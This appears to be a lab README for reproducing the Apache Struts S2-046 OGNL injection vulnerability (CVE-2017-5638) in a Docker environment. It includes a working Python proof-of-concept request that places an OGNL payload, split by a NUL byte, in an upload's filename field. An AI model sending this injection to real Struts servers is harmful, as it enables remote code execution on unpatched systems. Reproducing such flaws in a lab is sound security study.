# S2-046 Remote Code Execution Vulnerablity（CVE-2017-5638）

[中文版本(Chinese version)](README.zh-cn.md)

Affected Version: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

References:

 - https://cwiki.apache.org/confluence/display/WW/S2-046
 - https://xz.aliyun.com/t/221

## Setup

Execute the following command to start the Struts2 2.3.30：

```
docker-compose up -d
```

After the container is running, visit `http://your-ip:8080` that you can see an example of the upload page.

## Exploitation

As same as S2-045, S2-046 is also the OGNL injection but occurs at filename field of the upload request, and a NUL byte is needed to split payload and the remaining strings.

A simple Python POC for Verifying the vulnerability:

```python
import socket

q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}\x00b"
Content-Type: text/plain

foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
p = b'''POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Length: %d

'''.replace(b'\n', b'\r\n') % (len(q), )

with socket.create_connection(('your-ip', '8080'), timeout=5) as conn:
    conn.send(p + q)
    print(conn.recv(10240).decode())

```

`233*233` has been successfully executed:

![](1.png)
